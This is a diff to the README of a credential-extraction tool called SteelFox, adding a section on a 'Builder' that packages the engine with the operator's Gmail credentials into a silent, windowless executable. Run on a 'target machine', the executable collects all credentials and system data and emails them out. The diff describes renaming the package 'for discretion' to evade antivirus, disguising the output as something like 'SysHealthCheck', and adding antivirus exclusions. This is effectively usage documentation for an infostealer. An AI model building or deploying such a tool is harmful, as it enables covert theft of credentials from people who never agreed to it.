@@ -17,6 +17,7 @@
   <a href="#overview">Overview</a> •
   <a href="#coverage">Coverage</a> •
   <a href="#installation">Installation</a> •
+  <a href="#builder">Builder</a> •
   <a href="#usage">Usage</a> •
   <a href="#architecture">Architecture</a> •
   <a href="#outputs">Outputs</a> •
@@ -98,14 +99,98 @@ cd SteelFox
 pip install -r requirements.txt
 ```
 
-### Optional Build (Standalone)
+### Optional Build (Standalone CLI)
 
 ```powershell
 pip install pyinstaller
-pyinstaller steelfox.spec
+python build_console.py
 ```
 
+This produces `steelfox.exe` — a console-only standalone with no Python dependency.
+
 **Note on Antivirus Detection:** SteelFox executables may trigger false positives in antivirus software due to their credential extraction capabilities. This is expected behavior for security tools. If flagged, add the executable to your AV exclusions or run in a controlled testing environment.
+
+---
+
+## Builder
+
+The **SteelFox Builder** is a standalone graphical tool that lets you package and deploy a fully customized, zero-dependency credential recovery executable — pre-configured with your email reporting settings.
+
+<p align="center">
+  <img src="steelfox/assets/screen-shoot.png" alt="SteelFox Builder UI" width="80%" />
+</p>
+
+### What the Builder Does
+
+1. Takes your **SMTP credentials** (sender Gmail + app password) and **recipient email** as input  
+2. Packages the entire SteelFox engine + your credentials into a single `.exe`  
+3. The generated executable, when run on a target machine:
+   - Runs silently in the background (no console, no window)  
+   - Collects all credentials and system data  
+   - Generates an HTML report  
+   - Sends the report to your email automatically  
+
+### Running the Builder as a Python Script
+
+```powershell
+pip install -r requirements.txt
+python builder.py
+```
+
+### Running the Builder as a Standalone Executable
+
+A pre-built `steelfox_builder.exe` is provided. Just double-click it — no Python installation required.
+
+To rebuild it yourself:
+
+```powershell
+python build_builder.py
+```
+
+This produces `steelfox_builder.exe` at the root of the project.
+
+### Builder UI Walkthrough
+
+| Field | Description |
+|---|---|
+| **Output name** | Name of the generated `.exe` (e.g. `SysHealthCheck`) |
+| **Output directory** | Folder where the generated `.exe` will be saved |
+| **Icon** | Optional `.ico` file for the generated executable |
+| **Sender email** | Gmail address used to send the report |
+| **App password** | Gmail App Password (16-char, not your regular password) |
+| **Receiver email** | Email address that will receive the report |
+
+Once all fields are filled, click **Build Executable**. The build process:
+
+1. Copies the SteelFox source into a temp directory
+2. Renames the package to a neutral name to reduce AV heuristic triggers
+3. Patches the entry script with your encoded credentials
+4. Calls PyInstaller to produce a `--onefile --windowed` executable
+5. Moves the final `.exe` to your chosen output directory
+
+### Gmail App Password Setup
+
+The builder requires a **Gmail App Password**, not your account password:
+
+1. Go to [Google Account Security](https://myaccount.google.com/security)
+2. Enable **2-Step Verification**
+3. Under "App passwords", create a new one (name it anything)
+4. Use the generated 16-character code as the app password in the builder
+
+### Architecture of the Generated Executable
+
+```text
+YourExe.exe  (PyInstaller --onefile --windowed)
+└── _MEI*/
+    └── sysdiag/         ← SteelFox engine, renamed for discretion
+        ├── core/
+        └── modules/
+```
+
+- Runs without any console window  
+- No Python installation required on the target machine  
+- Report is sent by email; a local cache is saved in `%TEMP%\sys_diag_cache.html`  
+- Self-contained: all dependencies embedded
 
 ---
 
